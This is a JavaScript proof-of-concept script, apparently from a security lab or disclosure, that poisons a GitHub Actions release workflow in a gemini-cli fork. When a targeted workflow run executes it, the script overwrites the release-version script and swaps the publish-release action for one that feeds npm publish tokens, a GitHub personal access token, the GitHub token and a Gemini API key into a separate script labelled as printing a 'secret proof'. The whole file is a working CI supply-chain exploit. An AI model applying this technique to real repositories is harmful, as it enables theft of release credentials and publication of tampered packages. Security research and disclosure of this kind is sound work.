'use strict';

const fs = require('node:fs');
const path = require('node:path');

const workflowRef = process.env.GITHUB_WORKFLOW_REF || '';
const isTargetRun =
  process.env.GITHUB_ACTIONS === 'true' &&
  process.env.GITHUB_REPOSITORY === 'JelleBwns/gemini-cli' &&
  process.env.GITHUB_EVENT_NAME === 'workflow_dispatch' &&
  workflowRef.includes(
    '/.github/workflows/release-patch-3-release.yml@refs/heads/main',
  ) &&
  path.basename(process.cwd()) === 'release';

if (!isTargetRun) {
  console.log('LAB_RELEASE_PATCH_POC_SKIPPED_NON_TARGET_RUN');
  process.exit(0);
}

const workspace = process.env.GITHUB_WORKSPACE;
if (!workspace) {
  throw new Error('GITHUB_WORKSPACE is unavailable');
}

const versionScriptPath = path.join(workspace, 'scripts', 'get-release-version.js');
const publishActionPath = path.join(
  workspace,
  '.github',
  'actions',
  'publish-release',
  'action.yml',
);

const versionResult = {
  releaseVersion: '0.0.0-lab.1',
  releaseTag: 'v0.0.0-lab.1',
  npmTag: 'lab',
  previousReleaseTag: 'v0.0.0-lab.0',
};

fs.writeFileSync(
  versionScriptPath,
  `console.log(${JSON.stringify(JSON.stringify(versionResult))});\n`,
  'utf8',
);

const actionInputs = [
  ['release-version', false],
  ['release-tag', false],
  ['npm-tag', false],
  ['wombat-token-core', true],
  ['wombat-token-cli', true],
  ['wombat-token-a2a-server', true],
  ['github-token', true],
  ['github-release-token', true],
  ['dry-run', false],
  ['previous-tag', false],
  ['gemini_api_key', true],
  ['npm-registry-publish-url', false],
  ['npm-registry-url', false],
  ['npm-registry-scope', false],
  ['cli-package-name', false],
  ['core-package-name', false],
  ['a2a-package-name', false],
  ['working-directory', false],
].flatMap(([name, required]) => [
  `  ${name}:`,
  `    description: 'Lab input ${name}'`,
  `    required: ${required}`,
]);

const publishAction = [
  "name: 'Lab Release Secret Proof'",
  "description: 'Lab-only replacement installed at runtime by the poisoned PR checkout.'",
  'inputs:',
  ...actionInputs,
  'runs:',
  "  using: 'composite'",
  '  steps:',
  "    - name: 'Print lab secret proof'",
  "      shell: 'bash'",
  '      env:',
  "        LAB_WOMBAT_TOKEN_CORE: '${{ inputs.wombat-token-core }}'",
  "        LAB_WOMBAT_TOKEN_CLI: '${{ inputs.wombat-token-cli }}'",
  "        LAB_WOMBAT_TOKEN_A2A_SERVER: '${{ inputs.wombat-token-a2a-server }}'",
  "        LAB_GEMINI_CLI_ROBOT_GITHUB_PAT: '${{ inputs.github-release-token }}'",
  "        LAB_GEMINI_API_KEY: '${{ inputs.gemini_api_key }}'",
  "        LAB_GITHUB_TOKEN: '${{ inputs.github-token }}'",
  "      run: node release/scripts/lab-release-secret-proof.cjs",
  '',
].join('\n');

fs.writeFileSync(publishActionPath, publishAction, 'utf8');
console.log('LAB_RELEASE_PATCH_POC_RUNTIME_POISON_INSTALLED');
